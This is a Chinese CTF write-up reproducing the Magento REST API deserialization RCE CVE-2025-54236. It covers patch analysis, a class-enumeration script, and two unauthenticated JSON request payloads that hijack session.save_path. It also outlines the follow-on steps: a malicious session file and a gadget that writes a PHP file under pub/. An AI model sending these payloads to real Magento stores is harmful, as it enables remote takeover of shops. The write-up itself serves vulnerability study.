# This challenge has been ruined

这个题是关于上个月 Magento RCE 漏洞 CVE-2025-54236 的复现，在我计划出这个题的时候，这个漏洞并没有引起什么重视（大概），也几乎没有分析。但实际上使用 Magento 的网站非常多，实际上的危害也比较严重。

在我开始独立分析这个漏洞的时候，能获取到的信息只有：

> Our security team successfully reproduced one possible avenue to exploit SessionReaper, but there are likely multiple vectors. While we cannot disclose technical details that could aid attackers, the vulnerability follows a familiar pattern from last year's CosmicSting attack. The attack combines a malicious session with a nested deserialization bug in Magento's REST API.
> The specific remote code execution vector appears to require file-based session storage. However, we recommend merchants using Redis or database sessions to take immediate action as well, as there are multiple ways to abuse this vulnerability. -- sansec.io

和 CosmicSting 的分析报告 https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102。

还有本次漏洞的补丁 https://github.com/magento/magento2/commit/8075ae19428870e3b6e4b8f9e0705389328d4515。

综合上面的线索我们可以知道，这个RCE漏洞与 Session 相关，且漏洞形式与之前的 XXE 漏洞相同。

不过当我准备把他当作今年N1CTF的题目时，[slcyber.io](https://slcyber.io/assetnote-security-research-center/why-nested-deserialization-is-still-harmful-magento-rce-cve-2025-54236/)突然发布了关于这个漏洞的分析，就在比赛前的一周，这让我非常沮丧，甚至考虑放弃这道题目。但是这个漏洞本身的利用方法确实非常巧妙，我还是决定把它放出来。但是我不得不删除掉一些代码，以免我的题目被秒杀。=_=

非常有趣的是 CVE-2025-54236 的作者 Blaklis@The Flat Network Society，竟然做了这个用他的 CVE 出的题。

## 从补丁开始

先看一下补丁文件`lib/internal/Magento/Framework/Webapi/ServiceInputProcessor.php`

```php
private function getConstructorData(string $className, array $data): array
{
    $preferenceClass = $this->config->getPreference($className);
    $class = new ClassReflection($preferenceClass ?: $className);

    try {
        $constructor = $class->getMethod('__construct');
    } catch (\ReflectionException $e) {
        $constructor = null;
    }

    if ($constructor === null) {
        return [];
    }

    $res = [];
    $parameters = $constructor->getParameters();
    foreach ($parameters as $parameter) {
        if (isset($data[$parameter->getName()])) {
            $parameterType = $this->typeProcessor->getParamType($parameter);

            // 补丁增加的代码
            // Allow only simple types or Api Data Objects
            if (!($this->typeProcessor->isTypeSimple($parameterType)
                || preg_match('~\\\\?\w+\\\\\w+\\\\Api\\\\Data\\\\~', $parameterType) === 1
            )) {
                continue;
            }

            try {
                $res[$parameter->getName()] = $this->convertValue($data[$parameter->getName()], $parameterType);
            } catch (\ReflectionException $e) {
                // Parameter was not correclty declared or the class is uknown.
                // By not returing the contructor value, we will automatically fall back to the "setters" way.
                continue;
            }
        }
    }

    return $res;
}

```

这个`getConstructorData`在做下面的事情：

1. 获取传入的`$className`，并得到他的`preferenceClass`。因为有时候`$className`是一个接口，`preferenceClass`就是实现了该接口的默认类。
2. 获取传入类的构造方法，再获取构造方法的每个参数。
3. 遍历所有参数，执行下面的流程：
   1. 判断参数名是否在传入数组`$data`中，如果在，那么：
   2. 获取该参数的类型，将传入数组`$data`中对应的数据，转到到参数需要的类型。
   3. 保存转换后的实例。

而这个补丁限制了参数类型，要么是简单类型（String、Int等）、要么是类似（xxx\xxx\Api\Data\xxx）的类。

再来看一下`ConvertValue`在做什么

```php
public function convertValue($data, $type)
{
    if ($this->typeProcessor->isArrayType($type) && isset($data['item'])) {
        $data = $this->_removeSoapItemNode($data);
    }

    if ($this->typeProcessor->isTypeSimple($type) || $this->typeProcessor->isTypeAny($type)) {
        return $this->typeProcessor->processSimpleAndAnyType($data, $type);
    }

    if ($type == TypeProcessor::UNSTRUCTURED_ARRAY) {
        return $data;
    }

    return $this->processComplexTypes($data, $type);
}
```

`convertValue`判断传入的类型是否是数组、简单类型（String、Int等）、Any，然后进行对应的转换处理。除了这些之外，自定义类，会进入`processComplexTypes`。

```php
private function processComplexTypes($data, $type)
{
    $isArrayType = $this->typeProcessor->isArrayType($type);

    if (!$isArrayType) {
        return $this->_createFromArray($type, $data);
    }

    $result = is_array($data) ? [] : null;
    $itemType = $this->typeProcessor->getArrayItemType($type);

    if (is_array($data)) {
        $this->serviceInputValidator->validateComplexArrayType($itemType, $data);
        foreach ($data as $key => $item) {
            $result[$key] = $this->_createFromArray($itemType, $item);
        }
    }

    return $result;
}
```

在`processComplexTypes`中，会继续调用`_createFromArray`对传入数据进行转换。


```php
protected function _createFromArray($className, $data)
{
    $data = is_array($data) ? $data : [];
    // convert to string directly to avoid situations when $className is object
    // which implements __toString method like \ReflectionObject
    $className = (string) $className;
    if (is_subclass_of($className, \SimpleXMLElement::class)
        || is_subclass_of($className, \DOMElement::class)) {
        throw new SerializationException(
            new Phrase('Invalid data type')
        );
    }
    $class = new ClassReflection($className);
    if (is_subclass_of($className, self::EXTENSION_ATTRIBUTES_TYPE)) {
        $className = substr($className, 0, -strlen('Interface'));
    }

    // Primary method: assign to constructor parameters
    $constructorArgs = $this->getConstructorData($className, $data);
    $object = $this->objectManager->create($className, $constructorArgs);

    // Secondary method: fallback to setter methods
    foreach ($data as $propertyName => $value) {
        if (isset($constructorArgs[$propertyName])) {
            continue;
        }

        // Converts snake_case to uppercase CamelCase to help form getter/setter method names
        // This use case is for REST only. SOAP request data is already camel cased
        $camelCaseProperty = SimpleDataObjectConverter::snakeCaseToUpperCamelCase($propertyName);
        try {
            $methodName = $this->getNameFinder()->getGetterMethodName($class, $camelCaseProperty);
            if (!isset($this->methodReflectionStorage[$className . $methodName])) {
                $this->methodReflectionStorage[$className . $methodName] = $class->getMethod($methodName);
            }
            $methodReflection = $this->methodReflectionStorage[$className . $methodName];
            if ($methodReflection->isPublic()) {
                $returnType = $this->typeProcessor->getGetterReturnType($methodReflection)['type'];
                try {
                    $setterName = $this->getNameFinder()->getSetterMethodName($class, $camelCaseProperty);
                } catch (\Exception $e) {
                    if (empty($value)) {
                        continue;
                    } else {
                        throw $e;
                    }
                }
                try {
                    if ($camelCaseProperty === 'CustomAttributes') {
                        $setterValue = $this->convertCustomAttributeValue($value, $className);
                    } else {
                        $setterValue = $this->convertValue($value, $returnType);
                    }
                } catch (SerializationException $e) {
                    throw new SerializationException(
                        new Phrase(
                            'Error occurred during "%field_name" processing. %details',
                            ['field_name' => $propertyName, 'details' => $e->getMessage()]
                        )
                    );
                }
                if (is_string($setterValue) && $this->validateParamsValue($setterValue)) {
                    throw new InputException(
                        new Phrase(
                            '"%field_name" does not contains valid value.',
                            ['field_name' => $propertyName]
                        )
                    );
                }
                $this->serviceInputValidator->validateEntityValue($object, $propertyName, $setterValue);
                $object->{$setterName}($setterValue);
            }
        } catch (\LogicException $e) {
            $this->processInputErrorForNestedSet([$camelCaseProperty]);
        }
    }

    if ($object instanceof SearchCriteriaInterface) {
        $this->defaultPageSizeSetter->processSearchCriteria($object, $this->defaultPageSize);
    }

    return $object;
}
```

`_createFromArray`有着一个很复杂的流程，简单来说，他的工作是：
1. 递归的调用`getConstructorData`获取`$className`构造方法的参数。
2. 使用`objectManager->create`调用`$className`构造方法，并填充对应参数。（重点1）
3. 对于没有在构造方法中使用的参数，尝试调用他们的setter。（重点2）

再结合补丁内容：就会有一个比较明确的指向，调用任意类的构造方法或某个属性的setter导致的代码执行。感觉和万恶之源Fastjson很像（这也是我觉得这个洞比较有意思的原因）。

## 寻找可利用的类

当我尝试去搜索可能利用的类时，我惊呆了，Magento庞大而复杂的代码库让我一时不知道从何入手。

因此，我尝试模拟`getConstructorData`的执行逻辑，找到所有可能被实例化的类。根据提示这个漏洞是一个**未授权**的出现在**Rest API**上的反序列化。因此，我们可以列出所有不需要认证的RestAPI。

RestAPI的路由在`vendor/magento/module-webapi/Model/Rest/Config.php`的`getRestRoutes`函数中被处理（可以通过在请求调用链上打几个断点找到他），在这个函数中插入代码来导出所有的路由。

```php
public function getRestRoutes(\Magento\Framework\Webapi\Rest\Request $request)
{
    $requestHttpMethod = $request->getHttpMethod();
    $servicesRoutes = $this->_config->getServices()[Converter::KEY_ROUTES];

    // 插入的代码
    $all_acl = [];
    foreach ($servicesRoutes as $url => $httpMethods) {
        foreach ($httpMethods as $httpMethod => $methodInfo) {
            $acl = array_keys($methodInfo[Converter::KEY_ACL_RESOURCES]);
            $all_acl = array_merge($all_acl, $acl);
            if(in_array("anonymous",$acl)) {
                file_put_contents('/tmp/routes.log', $httpMethod . ' ' 
                . $url . ' '
                . $methodInfo[Converter::KEY_SERVICE][Converter::KEY_SERVICE_CLASS] . ' ' 
                . $methodInfo[Converter::KEY_SERVICE][Converter::KEY_SERVICE_METHOD] . ' '
                ."\n", FILE_APPEND);
            }
        }
    }
```

然后我们就能获得一个大概有200个路由的列表，类似

```
GET /V1/directory/currency Magento\Directory\Api\CurrencyInformationAcquirerInterface getCurrencyInfo 
GET /V1/directory/countries Magento\Directory\Api\CountryInformationAcquirerInterface getCountriesInfo 
GET /V1/directory/countries/:countryId Magento\Directory\Api\CountryInformationAcquirerInterface getCountryInfo 
POST /V1/customers Magento\Customer\Api\AccountManagementInterface createAccount 
GET /V1/customers/:customerId/password/resetLinkToken/:resetPasswordLinkToken Magento\Customer\Api\AccountManagementInterface validateResetPasswordLinkToken 
PUT /V1/customers/password Magento\Customer\Api\AccountManagementInterface initiatePasswordReset 
POST /V1/customers/resetPassword Magento\Customer\Api\AccountManagementInterface resetPassword 
POST /V1/customers/isEmailAvailable Magento\Customer\Api\AccountManagementInterface isEmailAvailable 
POST /V1/integration/admin/token Magento\TwoFactorAuth\Api\AdminTokenServiceInterface createAdminAccessToken 
POST /V1/integration/customer/token Magento\Integration\Api\CustomerTokenServiceInterface createCustomerAccessToken 
GET /V1/search Magento\Search\Api\SearchInterface search 
GET /V1/products-render-info Magento\Catalog\Api\ProductRenderListInterface getList 
GET /V1/guest-carts/:cartId Magento\Quote\Api\GuestCartRepositoryInterface get 
POST /V1/guest-carts Magento\Quote\Api\GuestCartManagementInterface createEmptyCart 
PUT /V1/guest-carts/:cartId/order Magento\Quote\Api\GuestCartManagementInterface placeOrder 
GET /V1/guest-carts/:cartId/shipping-methods Magento\Quote\Api\GuestShippingMethodManagementInterface getList 
POST /V1/guest-carts/:cartId/estimate-shipping-methods Magento\Quote\Api\GuestShipmentEstimationInterface estimateByExtendedAddress 
GET /V1/guest-carts/:cartId/items Magento\Quote\Api\GuestCartItemRepositoryInterface getList 
POST /V1/guest-carts/:cartId/items Magento\Quote\Api\GuestCartItemRepositoryInterface save 
PUT /V1/guest-carts/:cartId/items/:itemId Magento\Quote\Api\GuestCartItemRepositoryInterface save 
DELETE /V1/guest-carts/:cartId/items/:itemId Magento\Quote\Api\GuestCartItemRepositoryInterface deleteById 
GET /V1/guest-carts/:cartId/selected-payment-method Magento\Quote\Api\GuestPaymentMethodManagementInterface get 
PUT /V1/guest-carts/:cartId/selected-payment-method Magento\Quote\Api\GuestPaymentMethodManagementInterface set 
GET /V1/guest-carts/:cartId/payment-methods Magento\Quote\Api\GuestPaymentMethodManagementInterface getList 
```

发现这些路由对应的类都是Interface，那么还需要找到实际上实现了这个Interface的类，那么就需要把前面说的`preferenceClass`找出来（我的VScode处理Interface很糟糕），在 vendor/magento/framework/ObjectManager/Config/Config.php 的`getPreference`函数中插入代码：

```php
public function getPreference($type)
{
    $type = $type !== null ? ltrim($type, '\\') : '';
    $preferencePath = [];
    while (isset($this->_preferences[$type])) {
        if (isset($preferencePath[$this->_preferences[$type]])) {
            throw new \LogicException(
                'Circular type preference: ' .
                $type .
                ' relates to ' .
                $this->_preferences[$type] .
                ' and viceversa.'
            );
        }
        $type = $this->_preferences[$type];
        $preferencePath[$type] = 1;
    }

    // 插入的代码
    file_put_contents('/tmp/magento_pref.log', "");
    foreach ($this->_preferences as $k => $v) {
        file_put_contents('/tmp/magento_pref.log', "$k => $v" . "\n", FILE_APPEND);
    }
    return $type;
}
```

得到下面的结果，这样Interface在实例化时选择哪个实现类就比较清楚了。
```
DateTimeInterface => DateTime
Psr\Log\LoggerInterface => Magento\Framework\Logger\LoggerProxy
Magento\Framework\EntityManager\EntityMetadataInterface => Magento\Framework\EntityManager\EntityMetadata
Magento\Framework\EntityManager\HydratorInterface => Magento\Framework\EntityManager\Hydrator
Magento\Framework\View\Template\Html\MinifierInterface => Magento\Framework\View\Template\Html\Minifier
Magento\Framework\Model\Entity\ScopeInterface => Magento\Framework\Model\Entity\Scope
Magento\Framework\ObjectManager\FactoryInterface => Magento\Framework\ObjectManager\Factory\Dynamic\Developer
Magento\Framework\Search\Request\Aggregation\StatusInterface => Magento\LayeredNavigation\Model\Aggregation\Status
Magento\Framework\Search\Adapter\Aggregation\AggregationResolverInterface => Magento\Framework\Search\Adapter\Aggregation\AggregationResolver
Magento\Framework\App\RequestInterface => Magento\Framework\App\Request\Http
Magento\Framework\App\PlainTextRequestInterface => Magento\Framework\App\Request\Http
Magento\Framework\App\RequestContentInterface => Magento\Framework\App\Request\Http
Magento\Framework\App\Request\PathInfoProcessorInterface => Magento\Backend\App\Request\PathInfoProcessor
Magento\Framework\App\ResponseInterface => Magento\Framework\App\Response\Http
Magento\Framework\App\RouterListInterface => Magento\Framework\App\RouterList
Magento\Framework\App\FrontControllerInterface => Magento\Webapi\Controller\Rest
Magento\Framework\App\CacheInterface => Magento\Framework\App\Cache\Proxy
Magento\Framework\App\Cache\StateInterface => Magento\Framework\App\Cache\State
Magento\Framework\App\Cache\TypeListInterface => Magento\Framework\App\Cache\TypeList
Magento\Framework\App\ObjectManager\ConfigWriterInterface => Magento\Framework\App\ObjectManager\ConfigWriter\Filesystem
```

根据`getConstructorData`的逻辑，Magento在处理Rest请求时，会根据路由表查找到对应的类，再调用对应类的处理函数。例如`/V1/search`的实际处理函数是`Magento\Framework\Search\Search::search`

```php
public function search(SearchCriteriaInterface $searchCriteria)
{
    $this->requestBuilder->setRequestName($searchCriteria->getRequestName());

    $scope = $this->scopeResolver->getScope()->getId();
    $this->requestBuilder->bindDimension('scope', $scope);
```

然后body中的参数会作为`SearchCriteriaInterface`的 preferenceClass 也就是`SearchCriteria`类构造函数的参数，然后如果该构造函数中还有其他的类类型的参数，那么就会递归的处理这些类，直到全部为简单类型。

因此我们可以根据这个逻辑设计一个DFS算法，来列出所有可能被实例化的类。流程如下：
1. 提取一条路由
2. 获取路由处理函数的参数的类型
3. 获取该类型的构造函数，将该类型加入被选列表
4. 获取构造函数的参数的类型，重复第3条，直到路径过深或到简单类型。
5. 重复第1条，直到所有路由处理完毕

```php
<?php

use Magento\Framework\App\Bootstrap;
use Magento\Framework\App\ObjectManager;
use Magento\Framework\ObjectManager\ConfigInterface;
use Laminas\Code\Reflection\ClassReflection;
use Magento\Framework\Reflection\TypeProcessor;

try {
    require __DIR__ . '/../app/bootstrap.php';
} catch (\Exception $e) {
    exit(1);
}
$bootstrap = Bootstrap::create(BP, $_SERVER);

/**
 * @var ConfigInterface
 */
$config = ObjectManager::getInstance()->get(ConfigInterface::class);
$typeProcessor = new TypeProcessor();
$all_types = [];

function runall()
{
    global $all_types, $config, $typeProcessor;
    $routesFile = __DIR__ . '/routes.log';
    if (!file_exists($routesFile)) {
        die("routes.log 文件不存在\n");
    }
    $routes = file($routesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($routes as $route) {
        // 按空格分割每行
        $parts = preg_split('/\s+/', $route);
        if (count($parts) < 4) {
            continue; // 跳过格式不正确的行
        }

        $path = $parts[1]; // 第0号元素：路径
        $className = $parts[2]; // 第2号元素：类名
        $methodName = $parts[3]; // 第3号元素：方法名

        try {
            // 使用反射获取类和方法信息
            $reflectionClass = new ReflectionClass($className);
            if (!$reflectionClass->hasMethod($methodName)) {
                echo "类 {$className} 中不存在方法 {$methodName}\n";
                continue;
            }

            $reflectionMethod = $reflectionClass->getMethod($methodName);
            $parameters = $reflectionMethod->getParameters();

            // echo "类: {$className}, 方法: {$methodName}\n";
            // echo "参数:\n";
            // echo "{$className}.{$methodName}\n";
            foreach ($parameters as $parameter) {
                $paramType = $parameter->getType();
                if ($paramType) {
                    checkClass([$path, $className, $parameter->name], $paramType->getName(), $config, $typeProcessor, 1);
                }
            }

            // echo "\n";
        } catch (ReflectionException $e) {
            echo "反射错误: " . $e->getMessage() . "\n";
        }
    }
}

function checkClass($args, $className, ConfigInterface $config, TypeProcessor $typeProcessor, $depth)
{
    global $all_types;
    try{
        $class = new ClassReflection($className);
    } catch (\ReflectionException $e) {
        //echo "$depth $className (no class)\n";
        return;
    }
    if (is_subclass_of($className, \Magento\Framework\Api\ExtensionAttributesInterface::class)) {
        $className = substr($className, 0, -strlen('Interface'));
    }
    
    $preferenceClass = $config->getPreference($className);
    try {
        $class = new ClassReflection($preferenceClass ?: $className);
        $constructor = $class->getMethod('__construct');
    } catch (\ReflectionException $e) {
        return;
    }

    $t = $class->name;
    if ($t[0] == "\\") {
        $t = substr($t, 1);
    }

    if (in_array($class->name, $all_types)) {
        return;
    }
    if ($depth > 10) {
        //echo "$depth $t (too deep)\n";
        return;
    }

    $all_types = array_merge($all_types, [$class->name]);
    $all_types = array_unique($all_types);

    $parameters = $constructor->getParameters();
    foreach ($parameters as $parameter) {
        try{
            $parameterType = $typeProcessor->getParamType($parameter);
            if ($typeProcessor->isTypeSimple($parameterType) || $typeProcessor->isTypeAny($parameterType)) {
                continue;
            }
            if ($parameterType == "array[]") {
                continue;
            }
            if ($parameterType == ""){
                continue;
            }
            if (strpos($parameterType, '[]') !== false) {
                $parameterType = str_replace('[]', '', $parameterType);
            }
        } catch (\Throwable $e) {
            continue;
        }
        //echo "$depth $parameterType\n";
        $args[] = $parameter->name;
        checkClass($args, $parameterType, $config, $typeProcessor, $depth + 1);
        array_pop($args);
    }
}

runall();

foreach ($all_types as $type) {
    if(preg_match('~\\\\?\w+\\\\\w+\\\\Api\\\\Data\\\\~', $type) != 1){
        echo "use ". $type . ";\n";
    }
}

```

运行后，可以得到一个有300多个类的列表，类似这样

```php
<?php
use Magento\Customer\Model\Data\Customer;
use Magento\Framework\Api\ExtensionAttributesFactory;
use Magento\Framework\Api\AttributeValueFactory;
use Magento\Customer\Model\Metadata\CustomerCachedMetadata;
use Magento\Customer\Model\Metadata\CustomerMetadata;
use Magento\Customer\Model\AttributeMetadataConverter;
```

在我分析这个漏洞的时候，由于`malicious session`的描述过于模糊，你不能确定什么类的构造函数中就有逻辑涉及session操作，因此我把这300个类看了个遍（真是一个痛苦的经历，我有考虑过把这个任务交给AI，但是想到还要给AI开发基础设施就放弃了）。

但实际上这个`malicious session`的指向非常明确，就是类名里带着`Session`的下面几个类：

```php
<?php
use Magento\Framework\Session\Generic;
use Magento\Framework\Session\SidResolver\Proxy;
use Magento\Backend\Model\Auth\Session;
use Magento\Framework\Message\Session;
use Magento\Framework\Session\Config;
use Magento\Framework\Session\SaveHandler;
use Magento\Framework\Session\SaveHandlerFactory;
use Magento\Framework\Session\SessionMaxSizeConfig;
use Magento\Framework\Session\Validator;
use Magento\Framework\Session\Storage;
use Magento\Framework\Session\SessionStartChecker;
use Magento\Catalog\Model\Session;
```

其中`Magento\Framework\Session\Generic`的父类`Magento\Framework\Session\SessionManager`的构造函数中，调用的start方法非常可疑。
```php
public function __construct(
    \Magento\Framework\App\Request\Http $request,
    SidResolverInterface $sidResolver,
    ConfigInterface $sessionConfig,
    SaveHandlerInterface $saveHandler,
    ValidatorInterface $validator,
    StorageInterface $storage,
    \Magento\Framework\Stdlib\CookieManagerInterface $cookieManager,
    \Magento\Framework\Stdlib\Cookie\CookieMetadataFactory $cookieMetadataFactory,
    \Magento\Framework\App\State $appState,
    ?SessionStartChecker $sessionStartChecker = null
) {
    $this->request = $request;
    $this->sidResolver = $sidResolver;
    $this->sessionConfig = $sessionConfig;
    $this->saveHandler = $saveHandler;
    $this->validator = $validator;
    $this->storage = $storage;
    $this->cookieManager = $cookieManager;
    $this->cookieMetadataFactory = $cookieMetadataFactory;
    $this->appState = $appState;
    $this->sessionStartChecker = $sessionStartChecker ?: \Magento\Framework\App\ObjectManager::getInstance()->get(
        SessionStartChecker::class
    );
    $this->start();
}

public function start()
{
    if ($this->sessionStartChecker->check()) {
        if (!$this->isSessionExists()) {
            \Magento\Framework\Profiler::start('session_start');
            ...
            $this->initIniOptions();
            $this->registerSaveHandler();
            ...
        } else {
            $this->validator->validate($this);
        }
        $this->storage->init(isset($_SESSION) ? $_SESSION : []);
    }
    return $this;
}
private function initIniOptions()
{
    $result = ini_set('session.use_only_cookies', '1');
    ...
    foreach ($this->sessionConfig->getOptions() as $option => $value) {
        if ($option === 'session.save_handler' && $value !== 'memcached') {
            continue;
        } else {
            $result = ini_set($option, $value);
            ...
        }
    }
}
```

在`start`中调用了`initIniOptions`,在`initIniOptions`中读取了`sessionConfig`的所有options，并用`ini_set`设置了这些options。

而`sessionConfig`对应的是`Magento\Framework\Session\Config`类

```php
public function __construct(
    \Magento\Framework\ValidatorFactory $validatorFactory,
    \Magento\Framework\App\Config\ScopeConfigInterface $scopeConfig,
    \Magento\Framework\Stdlib\StringUtils $stringHelper,
    \Magento\Framework\App\RequestInterface $request,
    Filesystem $filesystem,
    DeploymentConfig $deploymentConfig,
    $scopeType,
    $lifetimePath = self::XML_PATH_COOKIE_LIFETIME
) {
    $this->_validatorFactory = $validatorFactory;
    $this->_scopeConfig = $scopeConfig;
    $this->_stringHelper = $stringHelper;
    $this->_httpRequest = $request;
    $this->_scopeType = $scopeType;
    $this->lifetimePath = $lifetimePath;
    ...
}

public function setSavePath($savePath)
{
    $this->setOption('session.save_path', $savePath);
    return $this;
}
```

但是看起来`Config`类很难去填充构造函数，但是之前提到的“重点2”让事情得到了转机，在调用完构造函数后，`_createFromArray`还会调用setter，而且`Config`中有一个`setSavePath`方法能够控制session文件的保存位置，这看起来与漏洞信息非常相符。

所以在找链子的脚本里面，插入
```php
if ($t == "Magento\Framework\Session\Generic"){
    $params = array_slice($args, 2);
    echo "$args[0]: " . implode(" -> ", $params) . "\n";
}
```

可以得到多组结果

```
/V1/guest-carts/:cartId/estimate-shipping-methods: address -> directoryData -> context -> urlDecoder -> urlBuilder -> request -> pathInfoProcessor -> helper -> backendUrl -> session
/V1/guest-carts/:cartId/estimate-shipping-methods: address -> directoryData -> context -> urlDecoder -> urlBuilder -> request -> pathInfoProcessor -> helper -> backendUrl -> formKey -> session
/V1/guest-carts/:cartId/estimate-shipping-methods: address -> directoryData -> context -> urlDecoder -> urlBuilder -> session
```

那么可以选择一条最短的路径，构造出如下的Payload

```
POST /rest/all/V1/guest-carts/123/estimate-shipping-methods HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=testing
Content-Length: 417
Content-Type: application/json

{
    "address": {
        "directoryData": {
            "context": {
                "urlDecoder": {
                    "urlBuilder": {
                        "session": {
                            "sessionConfig": {
                                "savePath": "/abc"
                            }
                        }
                    }
                }
            }
        }
    }
}
```

然后在 var/log/exception.log 中可以看到下面的错误信息，说明session的存储位置已经被成功修改。
```
Next Exception: Report ID: webapi-690751bea0b53; Message: Warning: SessionHandler::read(): open(/abc/sess_testing, O_RDWR) failed: No such file or directory (2) in /var/www/magento/vendor/magento/framework/Session/SaveHandler/Native.php on line 24 in /var/www/magento/vendor/magento/framework/Webapi/ErrorProcessor.php:208
```

而[slcyber.io](https://slcyber.io/assetnote-security-research-center/why-nested-deserialization-is-still-harmful-magento-rce-cve-2025-54236/)用的是另一个入口，但是他们没有在文章里讲清楚自己是如何发现这个类能够利用的。

为了避免本题被直接秒杀，我不得不删除了`paymentMethod`对应的Payment类，来增加一些难度。

```
PUT /rest/default/V1/guest-carts/abc/order HTTP/1.1
Host: example.com
Accept: application/json
Cookie: PHPSESSID=testing
Connection: close
Content-Type: application/json
Content-Length: 265

{
  "paymentMethod": {
    "paymentData": {
      "context": {
        "urlBuilder": {
          "session": {
            "sessionConfig": {
              "savePath": "does/not/exist"
            }
          }
        }
      }
    }
  }
}
```

## 上传恶意Session文件

因为PHP的Session文件是以序列化方式存储的，而且magento自身又带了非常多的依赖。因此一个很容易想到的路径是：上传一个带有恶意序列化数据的session文件，然后修改`session.save_path`，并带上一个PHPSESSID，来触发反序列话。

上传文件的流程，[slcyber.io](https://slcyber.io/assetnote-security-research-center/why-nested-deserialization-is-still-harmful-magento-rce-cve-2025-54236/)的博客已经讲的很清楚了，可以直接阅读他们的分析。

## 其他的疑问

由于本题采用的黑盒模式，有一些选手在使用`Guzzle/FW1`反序列化 Gadget 时直接假设了 magento 安装路径，导致写入失败。这个可以通过相对路径来解决，写入文件到"pub/xxx.php"中即可。

## 关于搭建本地环境

在docker构建完成后，需要更改/var/www/magento/app/etc/env.php中的db host，并设置到正确的数据库位置。